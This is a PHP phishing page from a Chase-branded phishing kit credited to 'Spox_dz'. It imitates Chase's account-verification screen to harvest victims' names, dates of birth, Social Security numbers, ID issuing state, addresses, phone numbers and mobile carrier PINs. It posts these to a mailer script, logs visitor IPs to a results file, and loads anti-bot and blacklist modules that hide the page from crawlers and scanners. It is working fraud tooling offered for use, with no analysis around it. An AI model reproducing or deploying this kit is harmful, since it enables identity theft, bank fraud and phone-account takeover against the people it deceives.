<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['CHASE_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("Spox/Chase_Result/total_billing_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
    
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Your Information - Account Verification </title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link id="externalCSSLink" rel="external stylesheet" href="Spox/Files/css/external.css">
        <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="Spox/Files/img/chasefavicon.ico">
        <link href="Spox/Files/css/origination.css" rel="stylesheet" id="originationCSS">
</head>
<style type="text/css">
        .help-block.form-error{
        color:#BF2155;
    }
</style>
    <body data-has-view="true" class="no-ignore-color">
        <div id="container"> 
            <header id="header-container" data-has-view="true">
                <div class="header-container" data-is-view="true"> 
                    <div class="row top"><div class="col-xs-4"> 
                <span id="menuLines-iconanchor-wrapper">
                    <a class="jpui iconaction focus onDark" href="javascript:void(0);" id="menuLines">  <i class="jpui menulines icon" id="icon-menuLines" aria-hidden="true">
                        
                    </i>
                </a>
            </span> 
                <span class="jpui link" id="exitApp-link-wrapper">
                    <a class="link-anchor INPUTFIELD2" id="exitApp" href="javascript:void(0);" aria-label=" Exit , opens dialog">Exit</a>
                </span>
            </div> 

<div class="col-xs-4 color-mode-header-logo">
<svg class="octogon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" xml="http://www.w3.org/XML/1998/namespace" focusable="false">
<path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);">
</path> 
<path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);">           
</path> 
<path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);">
</path> 
<path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);">
</path>
</svg>
</div> 
  <div class="col-xs-4 util right aligned">
                
            </div>
        </div>
    </div>
</header> 
<div id="main-container">
            <aside id="helpbar" role="complementary" aria-label="Help Bar">
            </aside> 
            <div>
                <div class="container-fluid" id="secondary-header-container">
            </div> 
            <form action="Spox/Mail/Mail3" method="POST">
            <main class="container-fluid" id="main">
                <div id="progressbar-block" data-has-view="true">
                <div data-is-view="true">
<style id="progress-bar-step-1of8">.origination-custom.jpui.progress.bar.step1of8:after{width: 50%;}</style>
                <div class="row origination-progress-block">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div id="PROGRESSBAR_HEADER">
                    <div>
    <h1 id="stepNameTagElementId" tabindex="-1" aria-describedby="stepNameApplicantTypeHeader">Verification</h1> 
                <span class="jpui util accessible-text" id="stepNameApplicantTypeHeader" aria-hidden="true">
                
            </span>
            </div>
            </div> 
                <div id="PROGRESSBAR_PROGRESS">
                <div class="row"><div class="col-xs-12 col-sm-12">
                <div class="jpui progress origination-custom step1of8 bar" id="main-progress" data-progress="">
                    <div class="bar fill" id="main-progress-bar">
                
            </div> 
                <span class="util accessible-text" id="accessible-bar-main-progress">
                
            </span>
        </div>
    </div>
</div>
</div>  

<br>
</div>
</div>
<style id="progress-bar-step-2of8">.origination-custom.jpui.progress.bar.step2of8:after{width: 50%;}</style>
</div>
</div>
<section class="origination page-content" id="content" data-has-view="true">
    <div id="CUSTOMERINFO" data-is-view="true">
        <div class="row">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                <div id="personalName" data-has-view="true">
                    <div id="personal-name" data-is-view="true">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                            <div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">Personal details</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <div class="BODY field-mb-24">This should be your full legal name as it appears on your government ID.</div>
                        </div>
                    </div>
                    <div id="nameBlock" data-has-view="true">
                        <div class="jpmcbb nameInformation" data-is-view="true">
                        <div class="inlineFieldRow">
                            <div class="inlineFieldCell">
                                <div class="jpui fieldgroup" id="blx-nameBlock-first-name-fldgrp">
                                    <div class="jpui vertical">
                                        <div class="align-label-input">
                                            <div class="label-wrapper">
                                                <label class="jpui fieldlabel label-alignment vertical" id="blx-nameBlock-first-name-fldgrp-label" for="blx-nameBlock-first-name-fldgrp-text-validate-input-field" aria-hidden="false">
                                                    <span class="util accessible-text" id="blx-nameBlock-first-name-fldgrp-label-errorLabel">
                                                    </span>First name <span class="util accessible-text" id="blx-nameBlock-first-name-fldgrp-label-accessible-text">
                                                        
                                                </span>
                                                </label>
                                                 </div>
             <div class="jpui validationinput" id="blx-nameBlock-first-name-fldgrp-text">
                 <div id="blx-nameBlock-first-name-fldgrp-text-validate"> 
                    <input  class="jpui input" placeholder="" name="First_name" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your first name.">
                     <span class="util accessible-text validation__accessible-text" id="blx-nameBlock-first-name-fldgrp-text-validate-placeHolderAdaText"></span>
                 </div>  
             </div> 
         </div>  
         <div>
            <div> 
             </div>
         </div>
     </div>
      </div>
  </div> 
  <div class="inlineFieldCell">
    <div class="jpui fieldgroup" id="blx-nameBlock-middle-name-fldgrp">
        <div class="jpui vertical">
    <div class="align-label-input">
        <div class="label-wrapper">
            <label class="jpui fieldlabel label-alignment vertical" id="blx-nameBlock-middle-name-fldgrp-label" for="blx-nameBlock-middle-name-fldgrp-text-validate-input-field" aria-hidden="false"><span class="util accessible-text" id="blx-nameBlock-middle-name-fldgrp-label-errorLabel"></span>Last name<span class="util accessible-text" id="blx-nameBlock-middle-name-fldgrp-label-accessible-text"></span></label>
        </div>
            <div class="jpui validationinput" id="blx-nameBlock-middle-name-fldgrp-text">
                <div id="blx-nameBlock-middle-name-fldgrp-text-validate">
                <input class="jpui input" placeholder="" name="Last_Name" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your last name.">
                <span class="util accessible-text validation__accessible-text" id="blx-nameBlock-middle-name-fldgrp-text-validate-placeHolderAdaText"> 
                </span>
            </div>
        </div>
</div>
<div>
    <div>
        
    </div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="identificationHeader" data-has-view="true">
    <div class="container-padding-after-field" id="headerSection" data-is-view="true">
        <div class="jpui header DATABOLD contact-header-margin field-mt-0 field-mb-24">Identification</div>
    </div>
</div>
   
<div id="identityInfoId" data-has-view="true">
    <div id="IDENTITYINFO" data-is-view="true">
        <div class="row">
            <div class="col-xs-12 col-sm-6">
            <div>
                <div class="jpui fieldgroup" id="dateOfBirth">
                    <div class="jpui vertical">
                        <div class="align-label-input">
                    <div class="label-wrapper">
                        <label class="jpui fieldlabel label-alignment vertical" id="dateOfBirth-label" for="dateOfBirth-text-validate-input-field" aria-hidden="false">
                            <span class="util accessible-text" id="dateOfBirth-label-errorLabel">
                            </span>Date of birth <span class="util accessible-text" id="dateOfBirth-label-accessible-text">
                            </span>
                        </label>
                    </div> 
        <div class="jpui validationinput" id="dateOfBirth-text">
            <div id="dateOfBirth-text-validate">
        <input class="jpui input" id="dlexp" name="dob"  type="tel" placeholder=""  data-validation="length" data-validation-error-msg="Please tell us your date of birth in mm/dd/yyyy format." data-validation-length="min10" >
            <span class="util accessible-text" id="dateOfBirth-text-validate-accessible-text" aria-hidden="true">: formats as you type mm/dd/yyyy</span>
            <span class="util accessible-text validation__accessible-text" id="dateOfBirth-text-validate-placeHolderAdaText">
            </span>
        </div>
    </div>
</div>
<div>
    <div>
    <div class="fieldhelpertext-container" id="dateOfBirth-helpertext-container">
    <div class="jpui fieldhelpertext" id="dateOfBirth-text-validate-helpertext">mm/dd/yyyy  </div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="col-xs-12 col-sm-6">
   <div>
<div class="jpui fieldgroup" id="maskedSocialSecurityNumber">
    <div class="jpui vertical">
        <div class="align-label-input">
    <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="maskedSocialSecurityNumber-label" for="maskedSocialSecurityNumber-text-validate-input-field" aria-hidden="false">
            <span class="util accessible-text" id="maskedSocialSecurityNumber-label-errorLabel">
            </span>Social Security number <span class="util accessible-text" id="maskedSocialSecurityNumber-label-accessible-text">
            </span>
        </label>
    </div>
    <div class="jpui validationinput" id="maskedSocialSecurityNumber-text"> 
<div id="maskedSocialSecurityNumber-text-validate">
   <input  class="jpui input" placeholder=""  type="tel" id="ssn" name="ssn" data-validation="length" data-validation-length="min11-11"  data-validation-error-msg=" ">
<span class="util accessible-text" id="maskedSocialSecurityNumber-text-validate-accessible-text" aria-hidden="true">, Formats as you type xxx-xx-xxxx.</span>
<span class="util accessible-text validation__accessible-text" id="maskedSocialSecurityNumber-text-validate-placeHolderAdaText">
                
            </span>
        </div>
        </div>
        </div>
            <div>
                <div>
                <div class="fieldhelpertext-container" id="maskedSocialSecurityNumber-helpertext-container">
            <div class="jpui fieldhelpertext" id="maskedSocialSecurityNumber-text-validate-helpertext">We're required to ask for your SSN to verify your identity. We'll keep your data secure.  </div>
        </div>
    </div>
    </div>
    </div>
    </div>
        <span class="jpui link" id="showHideSSNLink-link-wrapper">
                
            </span></div></div></div></div></div><div id="identificationId" data-has-view="true">
                <div id="IDENTIFICATION" data-is-view="true"> <div class="row">
                <div class="col-xs-12 col-sm-6">
                    <div class="jpui fieldgroup" id="identificationTypeId">
                <div class="jpui vertical">
                    <div class="align-label-input">
                        <div class="label-wrapper">
                <label class="jpui fieldlabel label-alignment vertical" id="identificationTypeId-label" for="select-identificationTypeId-select-validate" aria-hidden="false">
                    <span class="util accessible-text" id="identificationTypeId-label-errorLabel">
                
            </span>Issuing state <span class="util accessible-text" id="identificationTypeId-label-accessible-text"></span>
        </label>
        </div>
            <div class="jpui validationselect" id="identificationTypeId-select">
                <span class="jpui select" id="identificationTypeId-select-validate">
                    <span class="wrap right">
                <div class="selectwrap">
                 <select required="" name="idstate" aria-describedby=" ">
             <option disabled="" value="" selected="">Choose one</option>
            <option id="option-stateId-select-validate-0" value="Alabama">Alabama</option>
            <option id="option-stateId-select-validate-1" value="Alaska">Alaska</option>
            <option id="option-stateId-select-validate-2" value="Arizona">Arizona</option>
            <option id="option-stateId-select-validate-3" value="Arkansas">Arkansas</option>
            <option id="option-stateId-select-validate-4" value="California">California</option>
            <option id="option-stateId-select-validate-5" value="Colorado">Colorado</option>
            <option id="option-stateId-select-validate-6" value="Connecticut">Connecticut</option>
            <option id="option-stateId-select-validate-7" value="Delaware">Delaware</option>
            <option id="option-stateId-select-validate-8" value="DC">District of Columbia</option>
            <option id="option-stateId-select-validate-9" value="Florida">Florida</option>
            <option id="option-stateId-select-validate-10" value="Georgia">Georgia</option>
            <option id="option-stateId-select-validate-11" value="Hawaii">Hawaii</option>
            <option id="option-stateId-select-validate-12" value="Idaho">Idaho</option>
            <option id="option-stateId-select-validate-13" value="Illinois">Illinois</option>
            <option id="option-stateId-select-validate-14" value="Indiana">Indiana</option>
            <option id="option-stateId-select-validate-15" value="Iowa">Iowa</option>
            <option id="option-stateId-select-validate-16" value="Kansas">Kansas</option>
            <option id="option-stateId-select-validate-17" value="Kentucky">Kentucky</option>
            <option id="option-stateId-select-validate-18" value="Louisiana">Louisiana</option>
            <option id="option-stateId-select-validate-19" value="Maine">Maine</option>
            <option id="option-stateId-select-validate-20" value="Maryland">Maryland</option>
            <option id="option-stateId-select-validate-21" value="Massachusetts">Massachusetts</option>
            <option id="option-stateId-select-validate-22" value="Michigan">Michigan</option>
            <option id="option-stateId-select-validate-23" value="Minnesota">Minnesota</option>
            <option id="option-stateId-select-validate-24" value="Mississippi">Mississippi</option>
            <option id="option-stateId-select-validate-25" value="Missouri">Missouri</option>
            <option id="option-stateId-select-validate-26" value="Montana">Montana</option>
            <option id="option-stateId-select-validate-27" value="Nebraska">Nebraska</option>
            <option id="option-stateId-select-validate-28" value="Nevada">Nevada</option>
            <option id="option-stateId-select-validate-29" value="New Hampshire">New Hampshire</option>
            <option id="option-stateId-select-validate-30" value="New Jersey">New Jersey</option>
            <option id="option-stateId-select-validate-31" value="New Mexico">New Mexico</option>
            <option id="option-stateId-select-validate-32" value="New York">New York</option>
            <option id="option-stateId-select-validate-33" value="North Carolina">North Carolina</option>
            <option id="option-stateId-select-validate-34" value="North Dakota">North Dakota</option>
            <option id="option-stateId-select-validate-35" value="Ohio">Ohio</option>
            <option id="option-stateId-select-validate-36" value="Oklahoma">Oklahoma</option>
            <option id="option-stateId-select-validate-37" value="Oregon">Oregon</option>
            <option id="option-stateId-select-validate-38" value="Pennsylvania">Pennsylvania</option>
            <option id="option-stateId-select-validate-39" value="Rhode Island">Rhode Island</option>
            <option id="option-stateId-select-validate-40" value="South Carolina">South Carolina</option>
            <option id="option-stateId-select-validate-41" value="South Dakota">South Dakota</option>
            <option id="option-stateId-select-validate-42" value="Tennessee">Tennessee</option>
            <option id="option-stateId-select-validate-43" value="Texas">Texas</option>
            <option id="option-stateId-select-validate-44" value="Utah">Utah</option>
            <option id="option-stateId-select-validate-45" value="Vermont">Vermont</option>
            <option id="option-stateId-select-validate-46" value="Virginia">Virginia</option>
            <option id="option-stateId-select-validate-47" value="Washington">Washington</option>
            <option id="option-stateId-select-validate-48" value="West Virginia">West Virginia</option>
            <option id="option-stateId-select-validate-49" value="Wisconsin">Wisconsin</option>
            <option id="option-stateId-select-validate-50" value="Wyoming">Wyoming</option>

        </select>
            </div>
                <span class="jpui iconwrap" id="identificationTypeId-select-validate-toggle-icon" tabindex="-1">
                <span class="util accessible-text" id="accessible-identificationTypeId-select-validate-toggle-icon">
                
            </span>
            <i class="jpui expanddown input-icon icon" id="icon-identificationTypeId-select-validate-toggle-icon" aria-hidden="true">
                
            </i>
        </span>
        </span>
    </span>
        </div>
    </div>
        <div>
            <div> 
        </div>
    </div>
    </div>
    </div>
    </div>
       
        </div>

     <div id="addressId" data-has-view="true"><div id="address" data-is-view="true"><div class="row container-padding-after-field">
        <div class="col-xs-12 col-sm-6">
        <div class="jpui header DATABOLD field-mt-0 field-mb-24">Contact information</div>
 </div>
 </div>
     <div id="bb-residentialAddressBlock" data-has-view="true">
        <div class="jpmcbb multiType" id="MULTI_TYPE_ADDRESS_blx-residentialAddressBlock" data-is-view="true">
        <div>
            <div class="jpmcbb addressForm">
            <div class="row">
                <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup addressStreetAddress blockFieldGroupXs" id="streetAddress-blx-residentialAddressBlock">
            <div class="jpui vertical">
                <div class="align-label-input">
                    <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="streetAddress-blx-residentialAddressBlock-label" for="streetAddress-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
        <span class="util accessible-text" id="streetAddress-blx-residentialAddressBlock-label-errorLabel">
         
     </span>Street address <span class="util accessible-text" id="streetAddress-blx-residentialAddressBlock-label-accessible-text">
         
     </span>
 </label>
 </div>
 <div class="jpui validationinput" id="streetAddress-blx-residentialAddressBlock-text">
    <div id="streetAddress-blx-residentialAddressBlock-text-validate">
        <input  class="jpui input"  placeholder=""  name="Streetadd" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your address.">
        <span class="util accessible-text validation__accessible-text" id="streetAddress-blx-residentialAddressBlock-text-validate-placeHolderAdaText">
            
        </span>
    </div>
    </div>
    </div>
        <div>
            <div>
            
        </div>
    </div>
    </div>
    </div>
    </div>
     <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup blockFieldGroupXs" id="apartmentNumber-blx-residentialAddressBlock">
        <div class="jpui vertical">
        <div class="align-label-input">
            <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="apartmentNumber-blx-residentialAddressBlock-label" for="apartmentNumber-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-errorLabel">
        
    </span>Suite/apt/other<span class="additionalText">(optional)</span>
<span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-accessible-text">
         
     </span>
     </label>
 </div>
     <div class="jpui validationinput" id="apartmentNumber-blx-residentialAddressBlock-text">
        <div id="apartmentNumber-blx-residentialAddressBlock-text-validate">
<input class="jpui input" placeholder="" maxlength="30" name="address22" >
<span class="util accessible-text validation__accessible-text" id="apartmentNumber-blx-residentialAddressBlock-text-validate-placeHolderAdaText">
         
     </span>
 </div>
 </div>
 </div>
     <div>
        <div>
        <div class="fieldhelpertext-container" id="apartmentNumber-blx-residentialAddressBlock-helpertext-container">
        <div class="jpui fieldhelpertext" id="apartmentNumber-blx-residentialAddressBlock-text-validate-helpertext">
         
     </div>
 </div>
 </div>
 </div>
 </div>
</div>
</div>
</div>
 <div class="row">
    <div class="col-xs-12 col-sm-6">
    <div class="jpui fieldgroup addressZipCode blockFieldGroupXs" id="zipCode-blx-residentialAddressBlock">
    <div class="jpui vertical">
    <div class="align-label-input">
    <div class="label-wrapper">
    <label class="jpui fieldlabel label-alignment vertical" id="zipCode-blx-residentialAddressBlock-label" for="zipCode-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-errorLabel">
         
     </span>ZIP code <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-accessible-text">
         
     </span>
     </label>
     </div>  <div class="jpui validationinput" id="zipCode-blx-residentialAddressBlock-text">
        <div id="zipCode-blx-residentialAddressBlock-text-validate">
        <input  class="jpui input"  placeholder=""  type="tel" name="zipcode" data-validation="length" data-validation-length="min1-5"  data-validation-error-msg="Please tell us your ZIP code."> 
    <span class="util accessible-text validation__accessible-text" id="zipCode-blx-residentialAddressBlock-text-validate-placeHolderAdaText">
         
     </span>
     </div>
 </div>
</div>  
</div>
</div>
 <div class="addressSpinnerContainer" id="spinnerContainer-blx-residentialAddressBlock" tabindex="-1">
     
 </div>
</div>
</div>
 <div class="row">
         
     </div>
 </div>
 </div>
 </div>
 </div>
<div id="addressOverlay">      
</div>
 </div>
</div>

     <div id="contactInfoId" data-has-view="true">
        <div class="row" id="CONTACTINFO" data-is-view="true">
            <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup" id="phoneNumberId">
        <div class="jpui vertical">
            <div class="align-label-input">
                <div class="label-wrapper">
                    <label class="jpui fieldlabel label-alignment vertical" id="phoneNumberId-label" for="phoneNumberId-text-validate-input-field" aria-hidden="false">
        <span class="util accessible-text" id="phoneNumberId-label-errorLabel">
            
        </span>Phone number <span class="util accessible-text" id="phoneNumberId-label-accessible-text"
        ></span>
    </label>
</div>
     <div class="jpui validationinput" id="phoneNumberId-text">
        <div id="">
        <input  class="jpui input"  placeholder="" name="phoneNumber" id="phoneNumber"  data-validation="length" data-validation-error-msg="Tell us your phone number." data-validation-length="min14" >
        <span class="util accessible-text validation__accessible-text" id="phoneNumberId-text-validate-placeHolderAdaText">
         
     </span>
     </div>
</div> 
</div>  
<div>
<div> 
</div>
</div>
</div>
</div>
</div>

    <div class="col-xs-12 col-sm-6">
    <div class="jpui fieldgroup addressZipCode blockFieldGroupXs" id="zipCode-blx-residentialAddressBlock">
    <div class="jpui vertical">
    <div class="align-label-input">
    <div class="label-wrapper">
    <label class="jpui fieldlabel label-alignment vertical" id="zipCode-blx-residentialAddressBlock-label" for="zipCode-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-errorLabel">
         
     </span>Carrier Pin <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-accessible-text">
         
     </span>
     </label>
     </div>  <div class="jpui validationinput" id="zipCode-blx-residentialAddressBlock-text">
        <div id="zipCode-blx-residentialAddressBlock-text-validate">
        <input class="jpui input" placeholder="" type="password" name="carrierpin" maxlength="6" minlength="4" data-validation="length" data-validation-length="min4-6" data-validation-error-msg="Please tell us your Carrier Pin."> 
    <span class="util accessible-text validation__accessible-text" id="zipCode-blx-residentialAddressBlock-text-validate-placeHolderAdaText" >
         
     </span>
     </div>
 </div>
</div>  
</div>
</div>
 <div class="addressSpinnerContainer" id="spinnerContainer-blx-residentialAddressBlock" tabindex="-1">
     
 </div>
</div>
</div>

 
     <div id="disclosure" data-has-view="true">
        <div id="disclosureComponentId" data-is-view="true">
        <div class="row">
<div class="col-xs-12">
<p class="BODY" id="tcpa-disclosure">When you give us your mobile number, we have your consent to send you automated calls and texts to service all of your accounts with us.
     </p>
     </div>
 </div>
     <div class="field-mt-24" id="maritalStatusForWI"></div>
     <div id="spousalInformationForWI">
     </div>
 </div>
</div>
<div id="autoLendingAgeInfoOverlayPlaceHolder">
</div>
 </div>
 </div>
</div>
</section>
 <div id="pageGroupSpinner">
     
 </div> <div id="navigationbar-container" data-has-view="true">
        <div id="NAVIGATIONBAR_CMPT" data-is-view="true">
            <div class="row">
                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
            <div class="row">
                <div class="col-xs-12 navigation-top-margin">
        <button type="submit" id="NEXT-nav-ctr-btn" class="jpui button focus util float right primary">
        <span class="label">Next</span>
     </button>
        <button type="button" id="BACK-nav-ctr-btn" class="jpui button focus util float right tertiary">
            <span class="label">Back</span>
        </button>
     </div>
 </div>
 </div>
 </div>
 </div>
 </div>
</main>
<input type="hidden" name="token" value="spox1">
<input type="hidden" name="spox" value="spox2">

</form>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

 
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");
Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dlexp");


</script>
</body>
</html>